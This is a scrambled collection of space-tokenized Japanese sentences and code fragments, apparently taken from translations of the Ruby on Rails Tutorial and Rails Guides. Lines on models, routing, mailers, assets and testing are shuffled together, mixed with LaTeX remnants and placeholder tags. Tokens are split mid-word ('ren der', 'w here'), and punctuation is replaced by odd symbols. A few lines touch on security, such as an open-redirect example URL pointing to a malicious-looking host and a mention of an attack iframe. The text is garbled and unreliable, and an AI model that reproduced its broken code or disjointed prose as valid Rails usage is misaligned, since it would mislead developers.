以下 の メソッド に な っ て い る こと に 注意 し て くださ い 。
高度 な 技術
< nav >
自動 生成 さ れ た コード を 元 に 戻 す ため に は 、 新規 作成 さ れ た ファイル を 削除 する だけ で は な く 、 既存 の ファイル に 挿入 さ れ た コード も 削除 する 必要 が あ り ま す
実 は 、 Ruby   で は 丸 かっこ は 使用 し て も し な く て も 構 い ま せ ん ▟ 以下 の 2 つ の 行 は 同等 で す 。
この 節 の 内容 は 必須 で は あ り ま せ ん の で 、 スキップ し て も 問題 あ り ま せ ん 。
最初 の 行 に あ る \ kode {initialize } は 、 Ruby の 特殊 な メソッド で す ▟ これ は   \ kode {User ▖ new } を 実行 する と 自動 的 に 呼び出 さ れ る メソッド で す 。
      <p >
作成 し た コード を リスト \ ref{ code :stylesheets_ partial } に 示 し ま す
ただし 、 他 の 方法 と 併用 する の で あ れ ば 、 クライアント 側 で の バリデーション は ユーザー に 即座 に フィードバック を 返 す ため の 便利 な 方法 と な る で しょ う 。
{ 0 } { 1 } 第 8 章 { / 1 } { / 0 } で 認証 システム を 構築 し た こと で 、 認可 の ため の システム を 実装 する 準備 も でき ま し た 。
結合 テスト   ( RSpec   で は   \emph { リクエスト spec }   と 呼 ん で い ま す )   は 、 ユーザー が アプリケーション を 使 う 際 の 一連 の アクション を シミュレーション し ま す 。
         xml ▖ description (item_description (item) )   if  item_description (item)
以前 は \ kode {remember  user } を かっ こなし で 書 き ま し た が 、 三 項 演算 子 で は かっこ を 省略 する と 文法 エラー に な り ま す 。
これ まで いく つ か の 演習 で \ kode {let } メソッド を 使用 し て き ま し た が 、 今回 の よう に チュートリアル の 本文 で 言及 する の は これ が 初めて で す 。
# =>  Tue ,   0 6   Sep  2011   12 : 34 : 32   + 0000
length :   30 ,  omis sion : "▖▖▖ " )
$   rm   - rf tmp/
この 例 を 参考 に し て リレーションシップ 用 の fixture に テスト データ を 追加 する と 、 リスト \ ref{ code :relationships_fixtures } の よう に な り ま す 。
╼\end { aside }╼╼  \ section {User モデル } %  ( fold) ╼  \ label{ sec :user_ model} ╼╼
` offset ` を 追加 する と 以下 の よう に な り ま す 。
どちら の 関連 付け を どちら の モデル に 置 け ば よ い の で しょ う か 。
特に 、 / users へ の \ texttt { POST } リクエスト は \ kode { create } アクション に 送 ら れ ま す 。
\ kode {header } タグ の クラス と 同様 に 、 この クラス も Bootstrap に お い て 特別 な 意味 を 持 っ て い ま す 。
次 の \ ref{ sec : activation_test _and _ refactoring } で テスト を もう 少し 追加 し 、 リファクタリング を 少々 施 せ ば 完了 で す 。
{ 0 } 図 8 ▖ 10 { / 0 } { 1 } ローカル の ブラウザ で 記憶 トークン の cookies を 表示 する ▟ \ href { http://railstutorial ▖org / images/figures/cookie_ in_browser - full ▖ png } { ( 拡大 ) } { / 1 }
= >  [ " 1 " ,   " 2 " ,   " 3 " ,   " 4 " ]
` distance _ of_time_in_words ` と 基本 的 に 同じ 動作 で あ り 、 ` to_time` の 部分 が ` Time▖now ` に 固定 さ れ て い る 点 だけ が 異な り ま す 。
get  ':username ',  to :  'users # show ',  as : :user
{ 0 } 図 7 ▖ 17 { / 0 } { 1 } ユーザー 登録 失敗 時 の エラー メッセージ ▟ \ href { http://railstutorial ▖org / images/figures/signup_error _messages_bootstrap - full ▖ png } { ( 拡大 ) } { / 1 }
{ 0 } リスト 2 ▖ 11 { / 0 } ╼╼ { 1 } 1人 の ユーザー に 複数 の マイクロ ポスト が あ る ▟ { 2 } { / 2 }   { 3 } app/models/user▖ rb { / 3} { / 1 }
次回 以降 の 実行 時 に は 、 コピー さ れ て い な い マイグレーション のみ が コピー さ れ ま す 。
*   Strict - Transport - Security
class   Magazine  <  ActiveRecord : : Base
BigDecimal ▖ new ( 5 ▖ 0 0 ,   6 ) ▖ to _ formatted_s(:db )   # =>  " 5 ▖ 0 "
ある ページ を 開発 中 、 パーシャル の 部分 に つ い て は 詳細 を 気 に せ ず に 済 み ま す 。
独自 の Rake タスク を 定義 し た い 場合 は 、 Rakefile に 直接 書 く と 権限 が 強 すぎ る の で 、 なるべく lib/tasks フォルダ の 下 に Rake 用 の ファイル を 追加 する よう に し て くださ い 。
    x   =   x   +   1
リスト \ ref{ code : signup _ form } と リスト \ ref{ code : signup _ form_html } を じっくり 見比べ て み る と 、 以下 の 埋め込 み Ruby は
\ ref{ sec : hashes_and_symbols } で コンソール 上 で 実行 し た 例 を 思い出 し て み て くださ い ▟ そこ で は あえて \ kode {flash } と 名付け た ハッシュ を 使用 し て ハッシュ の 値 を 列挙 し ま し た 。
なお 第 \ ref { cha : modeling _ users }   章 で も 、 以下 の よう に \emph { モデル } を 自動 生成 する 方法 を 紹介 し ま す 。
無効 な 情報 が 送信 さ れ た 場合 、 更新 の 結果 と し て \ kode {false } が 返 さ れ 、 \ kode {else } に 分岐 し て 編集 ページ を 再度 レンダリング し ま す 。
以下 に 例 を 示 し ま す 。
上 は 「 \emph { 要素 代入   ( assignment ) } 」 で あ る こと に 注意 し て くださ い ▟ この current_user = は 別途 定義 が 必要 で す 。
たとえば 、 著者 が 実行 し た コマンド は 以下 の とおり で す 。
次 に 、 正し い パスワード を 与え て み ま しょ う ▟ 今度 は \ kode {authenticate } が その ユーザー オブジェクト を 返 す よう に な り ま す 。
*  `config ▖ force _ ssl` は 、 ` ActionDispatch : : SSL ` ミドルウェア を 使用 し て 、 すべて の リクエスト を HTTPS プロトコル 下 で 実行 する よう 強制 し ま す 。
     This   is   the   home   page   for   the
Sprockets は 異な る テンプレート エンジン へ の 一般 的 な インターフェイス と し て [ Tilt ] (https://github▖ com/rtomayko/tilt ) を 使用 する ため 、 gem に Tilt テンプレート プロトコル のみ を 実装 する だけ で 済 み ま す 。
( メソッド の 定義 は ファイル で 行 う の が 普通 な の で 、 コンソール で 行 う の は 少々 面倒 で す が 、 デモン ストーレション 目的 で あ れ ば 十分 で す ) 。
上 の よう に モデル に この メソッド を 追加 する と 、 次 の よう な 機能 が 使え る よう に な り ま す 。
customer▖ orders ( true ) ▖empty?     
####  内部 属性
     users ▖each  { |user |   Notifier ▖ notify ( user ,  ▖▖▖)  
umerate}╼╼    %  subsection  requiring _ logged_ in_users   ( end ) ╼╼    \ subsection { 正し い ユーザー を 要求 する } %  ( fold) ╼    \ label{ sec : requiring_ the_right _user} ╼╼
デフォルト は `' signed encrypted cookie '` で す 。
タイトル の テスト を 含 む StaticPages コントローラ の spec ファイル 。
コミット   ( commit )
まず は ユーザー 登録 フォーム の コード を 見直 し て み ま しょ う 。
  bun dle   exec   rake  rdoc
*  `config▖ action _mailer ▖ perform_ deliveries ` は 、 メール を 実際 に 配信 する か どう か を 指定 し ま す ▟ デフォルト は true で す 。
Using   /Users/mhartl/ ▖rvm/gems/ruby - 2 ▖ 0 ▖ 0 - p 0   with   gemset railstutorial_rails _ 4_ 0
" hello " ▖ at ( 10 )   # => nil
*  `headers` -  メール に 追加 し た い ヘッダー を 指定 し ま す 。
      invoke     rspec
##### ` w here `
sign - up
この 機能 を 追加 する に は 、 Rails から メール を 送信 する 機能 を 追加 する 必要 が あ り ま す 。
たとえば
gigabytes
思 っ て い た より も みすぼらし い で しょ う か 。
この トークン は 、 特に Activations コントローラ の \ kode {edit } アクション で は \ kode { params } ハッシュ で \ kode { params [ : id ] } と し て 参照 でき ま す 。
Ruby に は 、 文字 列 や 配列 を スライス し て 一部 を 取り出 す ビルト イン の メソッド を サポート し て い ま す 。
Micropost モデル の バリデーション に 対 する テスト  
この とき Active   Record は 、 \ kode {user_ id } が \ kode {first _user } の id   ( ここ で は \ kode { 1 } )   と 等し い マイクロ ポスト を 自動 的 に 返 し ま す 。
ここ で は 、 以下 の よう に \ kode {: source } キー を 省略 し て も よ い こと に も 注意 し て くださ い 。
結果 を コンソール 上 で 確認 でき ま す 。
CSS および Java Script アセット の 圧縮 を 制御 する に は 、 ` config ▖ assets▖css_ compressor ` および ` config ▖ assets▖js_ compressor ` を 使用 し ま す 。
*  `config ▖ assets▖ cache_store ` は 、 Sprockets で 使用 する キャッシュ ストア を 定義 し ま す 。
    ren der  " index "
authors  =   Author ▖ w here ( name :  'Hank  Moody') ▖ to_a
この メソッド で は ` : dasherize ` と その 同族 と 同様 の オプション が 使用 でき ま す ▟ それ ら の オプション は ビルダ に 転送 さ れ ま す 。
   def  process _with _stringified_params ( ▖▖▖)
*   Rails   4 ▖ 0 で は 、 リクエスト さ れ た フォーマット が アクション で 扱え な かっ た 場合 に ` Action Controller : :UnknownFormat ` が 発生 する よう に な り ま し た 。
現在 の ログ レベル を 変更 し た く な い 場合 は ` production ▖rb ` に 以下 の 行 を 追加 し て くださ い 。
#   Make   sure  your   secret_key_ base   is  kept  private
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/ regexp ▖rb ` で す 。
次 に \ kode {bun dle  install } を 実行 し て gem を インストール し ま す 。
kilobytes
$  git   checkout   4 - 0 - stable
問題 を 修正 する に は 、 もう 一 度 Return キー を 押 し ま す ) 。
config▖ mid dleware ▖ insert_before ( Rack : : Lock ,   ActionDispatch : : BestStandardsSupport)
\ kode { has\_many} や \ kode {belongs\_to } を 利用 する こと で 、 関連 付け を 通 し て 多く の メソッド が 使え る よう に な っ た
@number ▖try(:next )
置き換え た 結果 を { 0 } { 1 } リスト 4 ▖ 3 { / 1 } { / 0 } に 示 し ま す 。
   def  name
╼╼    \ subsection { 配列 と 範囲 演算 子 }  %  ( fold) ╼    \ label{ sec :arrays_and _ranges}╼╼
ドキュメント の 変更 内容 に つ い て 不明 な 点 が あ る 場合 は 、 GitHub の [ Rails ] (https://github▖ com/rails/rails/issues )   issue トラッカー で issue を 作成 し て くださ い 。
たとえば 、 ` assets▖ example ▖ com ` と い う アセット 専用 ホスト を 使用 し た い と し ま す 。
なお 、 レコード の 削除 の 場合 、 それ 専用 の ビュー テンプレート は 不要 で す ▟ その 代わり に 削除 後 に ` index ` アクション に リダイレクト し ま す 。
      invoke     assets
次 の よう に ユーザー id で も 関連 付け でき ま す 。
< %   sample▖ in_groups_of ( 3 )   do  | a ,   b ,  c| %>
Ruby   on   Rails 用 の パッチ を 提案 する 方法 に つ い て は 後述 し ま す 。
         class_ name : " My Application : : Business : : Supplier "
* `photo _ path(:id ) ` は `/photos/:id ` を 返 し ま す ▟  ( `photo _ path ( 10 ) ` で あ れ ば `/photos/ 10 ` が 返 さ れ ま す )
` vendor/plugins `   は Rails   3 ▖ 2 で 非 推奨 と な り 、 Rails   4 ▖ 0 で は 完全 に 削除 さ れ ま し た 。
この メソッド は 、 ` Array #<<` の 別名 で す 。
   def  perform ( trashable_class ,   trashable_ id ,   depth)
Client ▖ sum ( " orders_count " )
この 後 、 この よう な 手法 で Rails   Web サイト を 作成 する 方法 を ご 紹介 し ま す ▟ これ ら の 手法 は 、 いずれ も シンプル な 基本 テクニック の うえ に 成り立 っ て い ま す 。
エラー
" SSL " が 頭字 語 と 定義 さ れ て い る 場合 は 以下 の よう に エラー に な り ま す 。
# =>  Fri ,   0 1   Jan  2010   0 0 : 0 0 : 0 0   UTC   + 0 0 : 0 0 ▖ ▖
#   Your   secret  key  is  used   for   verifying   the integrity   of   signed cookies▖
Client ▖ order ( " orders_count   ASC ,   created_at   DESC " )
これ は 、 アセット を ホスト する 場所 と し て アプリケーション サーバー の 代り に CD N ( コンテンツ 配信 ネットワーク ) を 使用 し た い 場合 に 便利 で す 。
メイラー は Rails の コントローラ と 非常 に 似通 っ て い ま す 。
*   関連 する ドキュメント 、 実行 例 、 ガイド など 、 コード が 影響 する 部分 は すべて 更新 する こと 。
メソッド の 可視 性
#   Make   sure  the  secret   is  at   least   30   characters  and   all  random,
( [ delete ]   リンク の 統合 テスト   ( リスト \ ref{ code : delete_link_ integration_test } )   と 比較 し て み て くださ い ▟ )
|` default _options `|`mail ` メソッド オプション   ( `: from ` 、 `: reply_ to ` など ) の デフォルト 値 を 設定 し ま す 。
マイグレーション は ファイル に 保存 さ れ ま す ▟ ` rake ` を 実行 する と 、 Active   Record が サポート する あらゆる データベース に 対 し て マイグレーション が 実行 さ れ ま す 。
* `: dependent `
{ " a "  = >   1 ,   a :   2 } ▖ stringify _keys
ActiveSupport ▖ on_load(:action_controller )   do
たとえば 、 ` Client ` モデル に ` first _ name ` と い う フィールド が あ る と 、 `find_ by _ first _ name ` と い う メソッド が Active   Record に よ っ て 自動 的 に 作成 さ れ ま す 。
これ は リスト \ ref{ code :token_method } で 使用 さ れ て い ま し た 。
#### `all_day ` 、 `all _week` 、 `all_month` 、 `all_quarter ` 、 `all_ year `
サンプル アプリケーション の レイアウト   GREEN { 2 } { 3 } { / 3 } { 3 } { 4 } { / 4 } { / 3 } { 3 } { / 3}{ / 2 }
User メイラー プレビュー   ( 自動 生成 )
別 の ユーザー の フォロワー を 表示 する
ユーザー を 記憶 する に は 、 記憶 トークン を 作成 し て 、 その トークン を ダイジェスト に 変換 し た もの を データベース に 保存 し ま す 。
$ ('# logo') ▖ attr ( { src: "<%=   asset_path ( ' logo▖ png ')  %>" }) ;
{ " a "  = >   1 ,   a :   2 } ▖ transform _keys { |key|  key▖ to_s ▖upcase   }
マイクロ ポスト が ユーザー に 所属 する   ( \kode {belongs\_to} )   関連 付け  
たとえば 、 以下 の よう に 文字 列 を キー と し て 使用 でき ま す 。
保護 さ れ た ページ に アクセス し た 直後 の ログ インフォーム
これ は リスト \ ref{ code :user_ logout_test } で 使用 さ れ て い ま し た 。
Rails   4 ▖ 0 から Rails   4 ▖ 1 へ の アップグレード
新し い デフォルト の \ kode { from } アドレス を 使用 する アプリケーション メイラー
` beginning _ of _week ` は ` at_beginning _ of _week ` の 別名 、 ` end _of _week ` は ` at_end _of _week ` の 別名 で す 。
上 の 行 に よ っ て 、 `/blorgh ` パス に あ る エンジン が マウント さ れ 、 アプリケーション の この パス を 通 じ て のみ アクセス 可能 に な り ま す 。
アド オン を アプリ に 追加 する に は 、 以下 の コマンド を 実行 し ま す 。
\ kode { name } 属性 の 存在 性 を 検証 する   GREEN { 3 } { 4 } { / 4 } { 4 } { 5 } { / 5 } { / 4 } { 4 } { / 4 } { / 3 }
最初 から 最後 まで 、 途中 を 飛ば さ ず に や る の が 一番 効果 的 で 有益 な 読 み 方 で す ▟ ぜひ や っ て み て くださ い 。
ただし 、 おそらく Keep- Alive 接続 が 有効 に な っ て い な い とこ の 攻撃 は 効 か な い で しょ う ▟ 多く の ブラウザ は ワン タイム 接続 を 使用 し て い ま す 。
この とき は 、 選択 する 対象 は シンプル で し た ▟ 現在 の ユーザー に 対応 する ユーザー id を 持 つ マイクロ ポスト を すべて 選択 すれ ば よ かっ た の で し た 。
#### time_zone _options _ for_select
{ a :   1 ,  b :   2 ,  c :   3 } ▖slice(:b, : X )
CSRF 保護 を トリガー する よう に な り ま す 。
返 さ れ た 項目 の うち 、 最後 の 項目 だけ が 使用 さ れ ま す 。
create      app/assets/javascripts/blorgh/articles ▖js
正し い パスワード
*  ` development ` 環境 は 、 ローカル の 開発 環境 で アプリケーション と 手動 で やりとり を 行 う ため に 使用 さ れ ま す 。
   helper  module_ path
X - Cache - Hits :
Category ▖ joins ( articles : [{  comments: : guest  }, : tags ] )
SELECT  *  FROM   articles   WHERE   id   >   10   LIMIT   20
Micropost モデル の バリデーション  
resources   : photos
    if email ▖ has_attachments ?
これ を 行 う に は 、 \ kode {rails   generate rspec : install } を 実行 し ま す 。
まず 、 上 の 3 つ の 例 は いずれ も ルート へ の アクセス を 含 ん で い る こと に 気付 き ま す 。
Java Script 組み込 み Ruby を 使用 し て フォロー の リレーションシップ を 作成 する 。
|                     |  414                | : request _uri_too_ long              |
[ ] ▖ sum ( 1 )   # = >   1
    * `: address` -  リモート の メール サーバー を 指定 し ま す 。
self を 省略 し た 結果 を リスト \ ref{ code : downcase _bang } に 示 し ま す 。
| ---------------------- | ----------------------------------- |
Active   Record は 、 ORM   ( オブジェクト リレーショナル マッピング )   システム に 記述 さ れ て い る 「 Active   Record パターン 」 を 実装 し た もの で あ り 、 同じ 名前 が 付け られ て い ま す 。
       create    app/views/users/new▖html ▖erb
<%=   link_to   ' New  article ' ,   new_ article _ path %>
{ 0 } 図 11 ▖ 8 { / 0 }   { 1 } 別 ユーザー の プロフィール と マイクロ ポスト   ( \ href { http://local host : 3000 / users /5 }{ / users /5 }) { / 1 }
####  パーシャル レイアウト
articles   GET     /articles ( ▖: format )            articles #index
    mail ( subject :   " New  User   Signup : #{@user ▖email } " )
デフォルト は true で す 。
= > {: success= > " It   worked ! " ,  :error = > " It   failed▖ " }
    Ruby   console   for   yourapp ▖herokuapp▖ com
stylesheet_path  " application "  # => /assets/application ▖css
本 チュートリアル を 読 み 終え る 頃 に は 、 取り組み 前 の 知識 量 の 多少 に かかわ ら ず 、 より 高度 な Rails の 情報 源 を 理解 でき る よう に な っ て い る はず で す 。
今度 は この 機能 を アプリケーション の 中 で 使用 し て み ま しょ う 。
#  def  self ▖find_ by _ login_and _activated (*args)
レコード を 検索 し 、 レコード が な けれ ば 作成 する 、 と い う の は よく あ る 一連 の 流れ で す 。
有効 な 名前 が 既に あ れ ば 警告 が 表示 さ れ ま す 。
同様 に 以下 の コード は 、
Click   on  the  link  below to   activate  your   account :╼</p>╼╼< a   href = " http://rails -tutorial - c 9 - mhartl▖ c 9 ▖ io/account_activations/╼fFb_F 94 mgQtmlSvRFGsITw/edit ?
RVM を インストール 後 、 以下 を 実行 し て Ruby インストール の ため の 要件 を 調べ ま す 。
WARNING:   docrails に は 次 の 厳格 な ポリシー が 制定 さ れ て い る こと を 理解 し て お く 必要 が あ り ま す :   「 docrails の コード は 1 文字 たり とも 絶対 に 変更 し な い こと 」
ユーザー を 記憶 する
NOTE :   production モード で 見つか ら な い プリ コンパイル 済み ファイル が あ る と 、 見つか ら な い ファイル 名 を エラー メッセージ に 含 ん だ ` Sprockets: : Helpers: : RailsHelper: : AssetPaths: : AssetNotPrecompiledError ` が 発生 し ま す 。
    < head >
#####  Web ページ の 汚損
####   追加 さ れ た new アクション へ の ルーティング を 追加 する
以上 で 終わり で す 。
=>   " 2013 - 0 3 - 1 1   0 1 : 37 : 32 "
use   Rack : : ETag
これ は 最も 頻繁 に 使用 さ れ る オプション で す 。
#  or   operating   system ,   you   probably want  to   add   a  global  ignore   instead :
( Spring に 関連 し た エラー が 発生 し た ら 、 同じ コマンド を もう 一 度 実行 し て み て くださ い ) 。
Micropost モデル を 作成 し た とき に 、 マイクロ ポスト は 投稿 し た ユーザー の id   ( user_ id )   を 持 た せ る よう に し ま し た 。
*  `save !
この ブロック は 、 他 の イニシャライザ に よ っ て 設定 さ れ る 値 を 設定 する の に 便利 で す 。
###  マニフェスト ファイル と ディレクティブ
*   例外 を ログ に 残 し 、 ローカル から の リクエスト の 場合 は 、 デバッグ 用 の ページ を 表示 し ま す 。
ユーザー の 削除 は どの ユーザー に も 許可 でき る もの で は な い の で 、 管理 ユーザー   ( admin )   の 特権 クラス を 作成 し 、 この ユーザー に のみ 削除 を 許可 する よう に し ま す 。
( ちなみ に \ href { http://www ▖example ▖ com/}{ example ▖ com } と い う ドメイン 名 は 、 例 と し て 使用 する ため に 特別 に 予約 さ れ た ドメイン と な っ て い ま す )
" hello " ▖ to ( - 2 )  # =>  " hell "
###  関連 付け の コール バック
たとえば 、 ` global ▖css ` と い う CSS ファイル 名 は 以下 の よう に な り ま す 。
Rails は 、 マイグレーション 時 に 作成 日 と 更新 日 を 追跡 する ため の タイム スタンプ フィールド を 2 つ 作成 し ま す ▟ これ は 指定 が な く て も 自動 的 に 行 わ れ ま す 。
Active   Record で は 、 モデル 名 に 対応 する デフォルト の テーブル 名 を 求め る とき に この メソッド を 使用 し て い ま す 。
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/file/atomic ▖ rb ` で す 。
    sample  application ▖
     self ▖table_name_prefix   =  " "
Sprockets は すべて の Java Script ファイル を 1 つ の マスター ` ▖ js` ファイル に 連結 し 、 すべて の CSS ファイル を 1 つ の マスター ` ▖ css ` ファイル に 連結 し ま す 。
WARNING:  `find ` メソッド で 与え られ た 主キー の 中 に 、 どの レコード に も マッチ し な い 主 キー が * * 1 つ でも * * ある と 、 ` ActiveRecord : : Record NotFound ` 例外 が 発生 し ま す 。
  <%=   link_to   ' Destroy   Comment' ,  [ comment▖ article ,   comment ] ,
ユーザー 編集 ページ の テスト 。
以下 の SQL 文 で ` products ` テーブル を 作成 し た と し ま す 。
http://www▖ yourapplication▖ com/controller/action ? referer = http://www ▖malicious ▖tld
この ヘルパー は 、 与え られ た 集合 に 属性 の 値 が 含 ま れ て い る か どう か を 検証 し ま す 。
╼╼\ section { AccountActivations リソース } %  ( fold) ╼\ label{ sec : account_activations _ resource } ╼╼
def  visible_ articles
ren der   layout :   " special _layout "
同様 に 、 よく 使 わ れ る 操作 を ヘルパー メソッド と し て 定義 する こと も でき ま す 。
Guard 、 Spork 、 テスト 通知 機能   ( オプション )   を 使用 し て 便利 な テスト 環境 を 構築 する こと で 、 テスト 駆動 開発 が やみつき に な る こと で しょ う 。
属性 を 更新 する もう ひと つ の 方法 は 、 \ kode {update_attributes } を 使 う もの で す 。
悪意 の あ る ユーザー が この とき 最初 に 行な う の は 、 以下 の よう な 操作 で す 。
この クラス は 、 アプリケーション で 以下 の コマンド を 実行 し て 生成 でき ま す 。
*   Action   View の 概要 と Rails で の 利用 法
定義 済み の バリデーション 関数 は あ り ま せ ん 。
リソース フル で な い ルーティング
TIP:   データベース の 接続 設定 を 手動 で 更新 する 必要 は あ り ま せ ん 。
ありがた い こと に 、 文字 列 キー なら \ kode {cookies } で \emph { 使用 でき る } の で 、
n >╼\end {enumerate}╼╼    %  subsection   access_control   ( end ) ╼╼    \ subsection { マイクロ ポスト を 作成 する } %  ( fold) ╼    \ label{ sec : creating _microposts}╼╼
` ActiveSupport: : FileUpdateChecker`   API に 従 う 必要 が あ り ま す 。
最初 に 失敗 する テスト を 書 き 、 次 に その テスト に パス する よう に 実装 する こと で 、 正常 に 動作 する About ページ を 作成 でき た と い う 実感 を 得 る こと が でき ま す 。
<p > Hello ,   Rails !
上 の iframe は 、 [ Mpack 攻撃 フレームワーク ] ( http://isc ▖sans ▖org / diary ▖html ?storyid = 30 1 5 ) を 使用 し て イタリア に あ る Web サイト へ の 攻撃 で 実際 に 用い られ た もの で す 。
<p > Here   are   a  few of  our fine   products:</p>
Rails アプリケーション は 以下 の 値 を 空白 ( blank ) と みな し ま す 。
resources  : comments  do
[ { a :   1 ,  b :   2 } ,  { c :   3 } ] ▖ to _xml
option_groups_ from_collection_for_select (@continents ,  : countries , : name ,   : id ,  : name ,   3 )
最初 の ユーザー 登録 ページ   ( スタブ )
gem 'blorgh ' ,   path: "/ path/to/blorgh "
余計 な もの を 削ぎ落 し た 結果 、 シンボル 同士 の 比較 を 容易 に 行え ま す ▟ 文字 列 は 1 文字 ずつ 比較 する 必要 が あ り ま す が 、 シンボル は 一 度 に 全体 を 比較 でき ま す 。
上 の 呼び出し に よ り 、 `_menu▖html ▖erb ` と い う 名前 の ファイル の 内容 が 、 ren der メソッド を 書 い た その 場所 で レンダリング さ れ ま す 。
先ほど 、 コンソール の 出力 結果 から ユーザー の ID が   \ kode { 1 }   で あ る こと を 確認 し ま し た ▟ 次 の 目標 は 、 この よう な ユーザー 情報 を Web アプリケーション 上 に 表示 する こと で す 。
Pending :
    QualifiedConstUtils ▖raise_ if_absolute ( path )
しかし 、 ヘルパー モジュール が 存在 し な い ため に 別 の ライブラリ が 必要 に な り 、 それ が さらに 見つか ら な い と い う 場合 が 考え られ ま す 。
" Invoice Line " ▖ foreign_key    # => " invoice _ line _ id "
\ kode { create } アクション で Strong   Parameters を 使用 する
以下 の 場合 は 等幅 フォント を 使用 する こと 。
人々 が ソフトウェア に 恐怖 心 を 抱 く の は 、 結局 これ が 原因 な の だ 。
必要 と な る \ kode { picture } 属性 を Micropost モデル に 追加 する ため に 、 マイグレーション ファイル を 生成 し 、 開発 環境 の データベース に 適用 し ま す 。
use   Rack : : Sendfile
date▖ years_ since ( 10 )   # =>  Sun ,   0 7   Jun   2020
ユーザー 登録 ページ の モックアップ
  *   冒頭 に アンダース コア が あ る 場合 は 削除 し ま す 。
上 の コード を \ kode {edit } アクション   ( リスト \ ref{ code : account_activation_edit_ action } )   で 使用 し ま す 。
###  Gmail 用 の Action   Mailer 設定
同様 に 、 以下 の よう な コード を 何 度 も 書 く の は 多く の 人 に と っ て 苦痛 だ と 思 い ま す 。
NOTE :   Ruby   on   Rails の 最新 リリース で 見つけ た バグ は 最も 注目 を 集め る 可能 性 が あ り ま す 。
ステータス フィード の パーシャル
     parts_order :  [ " text /plain " ,   " text/enriched " ,   " text /html " ]
なお 、 本書 を 進め る 間 、 アプリケーション を 定期 的 に GitHub に プッシュ し たり 、 Heroku に デプロイ する こと を お 勧め し ま す 。
ren der  file :  filename ,  content_type:  " application/rss "
\ kode { class  Users Controller <  Application Controller } と い う 記法 は 、 Ruby の \emph { クラス } で の \emph { 継承 } の 使用 例 と な っ て い る こと に も 注目 し て くださ い
{ 0 } 図 5 ▖ 8 { / 0 }   { 1 } \ href { http://local host : 3000/about}{/about } で 表示 さ れ る About ページ { / 1 }
Git で バージョン 管理 を 行な っ て い る の で あ れ ば 、 この タイミング で ユーザー を モデリング する ため の トピック ブランチ を 作成 し て お い て くださ い 。
\emph {spork } は spoon - fork を 組み合わせ た 造語 で す 。
Rails は 、 この よう な メッセージ を User モデル の 検証 時 に 自動 的 に 生成 し て くれ ま す 。
Rails の 各 バージョン の 変更 点 を ここ に 記録 し ま す 。
The  inheritance   hierarchy   for   the  ( non -built - in )   \kode { Word }  class   from   Listing   \ ref{ code :word_ class } ▖
それ 以外 の 場合 は 、 ` Float ` で 値 を 数値 に 変換 し て から バリデーション を 行 お う と し ま す 。
*  `collection ▖exists ? ( ▖▖▖)
ルーティング ヘルパー を 使用 する 方法 の 他 に 、 パラメータ の 配列 から パス や URL を 作成 する こと も でき ま す 。
╼\end{ code }╼╼    \ subsection { ユーザー が セキュア な パスワード を 持 っ て い る } %  ( fold) ╼    \ label{ sec : has_ secure_ password } ╼╼
\ ref{ sec : signup _failure } で は 、 ユーザー が 制約 に 違反 し た とき に 、 検証 機能 に よ っ て 自動 的 に 表示 さ れ る 有用 な エラー メッセージ を お 見せ し ま す 。
動的 ファイン ダ
╼╼    %  subsection   subsection _name   ( end ) ╼╼    \ subsection { 文字 列 }  %  ( fold) ╼    \ label{ sec : strings} ╼╼
options _ from_collection_for_select ( collection ,   value _method ,   text _ method ,  selected = nil )
この ため 、 以下 の よう な 旧式 の ハッシュ ロケット 記法 を 使用 する しか な い の で す 。
flash [ " string " ]  =  " a   string "
Confirm   Dialog ] ( images/getting _ started/confirm_dialog ▖ png )
#   name        : string ( 25 5 )
なお 、 ローカル システム 上 で 開発 する 場合 は 普通 の ターミナル を 使用 し ま す ▟ クラウド IDE を 使用 し て い る 場合 は 、 図 \ ref { fig : ide_anatomy } の コマンドライン エリア に 入力 し ま す 。
コンソール で \ kode { Word } クラス を 定義 する 。
\ kode { name } 属性 と \ kode {email } 属性 の 存在 性 を 検証 する 。
###  JSON   support
これ は リスト \ ref{ code : demo_microposts_controller } で 使用 さ れ て い ま し た 。
_first _feed _implementation   ( end ) ╼╼    \ subsection { サブ セレクト } %  ( fold) ╼    \ label{ sec :scopes_subselects_and_a_lambda}╼╼
上 の コード で は 、 ` app/views/shared/_menu▖html ▖erb ` パーシャル を 読み込 ん で 使用 し ま す 。
逆 に 大きな 章 で 構成 さ れ て い る ドキュメント で あ れ ば 、 " Examples " セクション を 設け て も よ い 。
" It   worked ! "
コメント する あなた が 十分 時間 を かけ て プルリクエスト を 読 ん だ と い う こと が 皆 に 伝わ る よう に 書 き ま しょ う 。
この 実装 に は 1 つ だけ トリッキー な 部分 が あ り ま す ▟ それ は Users コントローラ に 2 つ の 新し い アクション を 追加 する 必要 が あ る と い う こと で す 。
ブロック に は 複数 の 行 を 記述 でき ま す   ( 実際 ほとんど の ブロック は 複数 行 で す ) 。
` prev_ year ` は ` last_ year ` の 別名 で す 。
その ブロック 内 で は 、 プロキシ に 対 し て 呼び出 さ れ た メソッド に オプション を 追加 し た うえ で 、 その メソッド を レシーバ に 転送 し ま す 。
従 っ て 、 アプリケーション で 必要 な ルーティング を 個別 に 設定 する こと に な り ま す 。
リソース ベース の ルーティング   ( 以下 リソース ルーティング )   を 使用 する こと で 、 リソース ベース で 構成 さ れ た コントローラ に 対応 する 共通 の ルーティング を 手軽 に 宣言 でき ま す 。
API が 安定 し た ら 可視 性 を 変更 でき ま す が 、 後方 互換 性 を 保 ち ながら パブリック な API を 変更 する こと は 簡単 で は あ り ま せ ん 。
#####  実行 時 に レイアウト を 指定 する
=>  " level "
Asset   Pipeline で は Less を 使 う こと も でき ま す ▟ 詳し く は \ href { http://rubygems ▖org / gems/ less - rails - bootstrap}{\ texttt { less - rails - bootstrap }   gem } を 参照 し て くださ い 。
\ ref{ sec :hello_ world } で は この デフォルト ページ を 削除 し 、 カスタマイズ し た ホーム ページ に 置き換え る 予定 で す 。
#### ` constantize`
これ は リスト \ ref{ code : validates_uniqueness _of_email } で 使用 さ れ て い ま し た 。
( enter   " h "   for  help )   [ Ynaqdh]
Rails に は モデル 作成 用 の ジェネレータ も あ り 、 多く の Rails 開発 者 が モデル 作成 の 際 に 使用 し て い ま す 。
ユーザー 表示 ページ 用 の テスト 。
この 重大 な バグ を 取り除 く に は [ 最新 の バージョン 4 ] ( http://www ▖redcloth ▖org ) を 入手 し て くださ い 。
   break ;
Rails ▖ application▖ configure  do
\ kode {user } に 紐付 い た マイクロ ポスト を 作成 する   ( 失敗 時 に 例外 を 発生 )
